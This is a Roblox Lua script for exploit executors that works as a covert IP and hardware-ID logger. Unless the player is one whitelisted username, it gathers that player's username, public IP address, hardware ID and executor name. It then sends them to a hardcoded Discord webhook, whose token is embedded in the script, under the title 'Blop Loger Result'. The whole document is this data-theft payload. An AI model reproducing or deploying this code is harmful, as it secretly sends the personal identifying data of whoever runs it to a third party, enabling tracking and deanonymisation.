if game.Players.LocalPlayer.Name == "Anonymy4876" then
	print("Bypased")
else
	local http_request = http_request or request or HttpPost or syn.request or http.request;
	local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
	local decoded = game:GetService('HttpService'):JSONDecode(body)
	local hwid = decoded.headers["Syn-Fingerprint"]
	local ip = tostring(game:HttpGet("https://api.ipify.org", true))
	local hwid = game:GetService("RbxAnalyticsService"):GetClientId();
	local webhookcheck = 
	   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
	   secure_load and "Sentinel" or
	   KRNL_LOADED and "Krnl" or
	   SONA_LOADED and "Sona" or
	   "Kid with shit exploit"
 
	local url =
	   "https://discord.com/api/webhooks/1041782128226082826/QNyeWpfPsroPvJPpqn4A3jJSXMjCmIKqPNILCiQlxAJXUY19ajuH8KikY2dowFfkygVx"
	local data = {
	   ["content"] = "",
	   ["embeds"] = {
	       {
	           ["title"] = "**Blop Loger Result**",
	           ["description"] = "**Username: " .. game.Players.LocalPlayer.Name.." with "..webhookcheck.." \nIP: "..ip.. " \nHWID: "..hwid.."**",
 
	           ["type"] = "rich",
	           ["color"] = tonumber(0x7269da),
	           ["image"] = {
	               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
	                   tostring(game:GetService("Players").LocalPlayer.Name)
	           }
	       }
	   }
	}
	local newdata = game:GetService("HttpService"):JSONEncode(data)
 
	local headers = {
	   ["content-type"] = "application/json"
	}
	request = http_request or request or HttpPost or syn.request
	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
	request(abcdef)
end
